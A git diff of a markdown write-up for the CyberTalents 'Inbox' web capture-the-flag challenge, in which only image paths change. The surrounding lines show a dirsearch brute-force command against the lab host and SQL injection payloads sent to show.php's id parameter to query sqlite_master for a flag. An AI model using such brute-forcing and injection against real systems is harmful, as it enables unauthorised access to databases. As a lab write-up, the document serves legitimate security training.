@@ -1,14 +1,14 @@
 # Solve Inbox
 #### https://cybertalents.com/challenges/web/Inbox
 
-![alt text](image.png)
+![alt text](images/image.png)
 ### Run Directory bruteforce
 `dirsearch -u http://wcamxwl32pue3e6m86dv9q5i4vlgj6zqdkgxu639-web.cybertalentslabs.com -x 403,404`
 *you can find the output in [Directories.txt](Directories.txt)*
 
 We found /data
 
-![alt text](image-1.png)
+![alt text](images/image-1.png)
 
 ### Analyze with burp
 The request to view an email is sent to `show.php`
@@ -46,11 +46,11 @@ Try to dump the database tables but I get null.
 Try id table:
 
 `id=(select+id+from+sqlite_master+where+Title="Hi")`
-![alt text](image-2.png)
+![alt text](images/image-2.png)
 
 Search for a message with title flag
 `id=(select+id+from+sqlite_master+where+Title="flag")`
-![alt text](image-3.png)
+![alt text](images/image-3.png)
 
 ### Resources
 [SQLite cheet sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
